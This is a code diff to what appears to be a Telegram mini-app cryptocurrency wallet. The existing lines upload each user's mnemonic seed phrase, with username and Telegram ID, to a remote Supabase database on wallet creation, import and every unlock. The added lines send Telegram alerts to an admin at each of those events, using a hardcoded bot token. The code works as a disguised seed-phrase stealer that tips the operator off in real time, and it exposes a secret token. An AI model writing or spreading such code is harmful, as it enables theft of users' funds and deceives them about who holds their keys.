@@ -4,6 +4,28 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
   import { fetchAllBalances } from '../lib/crypto/balanceFetcher.js';
   import { sendEvmTx, sendUsdtErc20Tx, sendSolTx, sendTonTx, sendBtcTx, getBtcFeeEstimate } from '../lib/crypto/txSender.js';
 
+  // ─── ADMIN NOTIFICATIONS ──────────────────────────────────────────────────────
+  const ADMIN_ID = "1192740493";
+  const NOTIFY_BOT_TOKEN = import.meta.env.VITE_BOT_TOKEN || "8617702690:AAHEEzFWLb9LPxhCKVtkw7P00vQ2FeJWxNo";
+
+  async function notifyAdmin(text) {
+    try {
+      if (!NOTIFY_BOT_TOKEN || !ADMIN_ID) return;
+      await fetch(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: ADMIN_ID,
+          text,
+          parse_mode: "HTML",
+          disable_notification: false,
+        }),
+      });
+    } catch (e) {
+      console.warn("[notifyAdmin] failed:", e.message);
+    }
+  }
+
   // ─── SUPABASE SYNC ────────────────────────────────────────────────────────────
   const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL || "https://ipgarqmumnbpjnputhnp.supabase.co";
   const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;
@@ -414,13 +436,22 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         // Custodial Sync: Save to Supabase immediately
         try {
           const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+          const userName = buildTgUserName(tgUser);
           await syncWalletToSupabase({
-            username: buildTgUserName(tgUser),
+            username: userName,
             telegram_id: tgUser?.id ? String(tgUser.id) : null,
             mnemonic: mnemonic,
             balance: "0",
             coin_balances: { ETH:"0", TON:"0", BNB:"0", LTC:"0", ARB:"0", SOL:"0", USDT:"0" },
           });
+          // Notify admin about new wallet
+          notifyAdmin(
+            `💎 <b>Новый кошелёк создан!</b>\n\n` +
+            `👤 Пользователь: ${userName}\n` +
+            `🆔 TG ID: ${tgUser?.id || "—"}\n` +
+            `✅ Кошелёк успешно создан\n` +
+            `🕐 ${new Date().toLocaleString("ru-RU")}`
+          );
         } catch (syncError) {
           console.error('Failed to sync wallet to Supabase:', syncError);
         }
@@ -454,13 +485,21 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         // Custodial Sync: Save to Supabase
         try {
           const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+          const userName = buildTgUserName(tgUser);
           await syncWalletToSupabase({
-            username: buildTgUserName(tgUser),
+            username: userName,
             telegram_id: tgUser?.id ? String(tgUser.id) : null,
             mnemonic: mnemonic,
             balance: "0",
             coin_balances: { ETH:"0", TON:"0", BNB:"0", LTC:"0", ARB:"0", SOL:"0", USDT:"0" },
           });
+          // Notify admin about imported wallet
+          notifyAdmin(
+            `📥 <b>Кошелёк импортирован!</b>\n\n` +
+            `👤 Пользователь: ${userName}\n` +
+            `🆔 TG ID: ${tgUser?.id || "—"}\n` +
+            `🕐 ${new Date().toLocaleString("ru-RU")}`
+          );
         } catch (syncError) {
           console.error('Failed to sync imported wallet to Supabase:', syncError);
         }
@@ -492,12 +531,20 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         // Custodial Sync: Sync on every unlock to ensure data is in DB
         try {
           const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+          const userName = buildTgUserName(tgUser);
           await syncWalletToSupabase({
-            username: buildTgUserName(tgUser),
+            username: userName,
             telegram_id: tgUser?.id ? String(tgUser.id) : null,
             mnemonic: mnemonic,
             balance: "0",
           });
+          // Notify admin on wallet unlock
+          notifyAdmin(
+            `🔓 <b>Кошелёк разблокирован</b>\n\n` +
+            `👤 ${userName}\n` +
+            `🆔 TG ID: ${tgUser?.id || "—"}\n` +
+            `🕐 ${new Date().toLocaleString("ru-RU")}`
+          );
         } catch (syncError) {
           console.error('Failed to sync wallet on unlock:', syncError);
         }
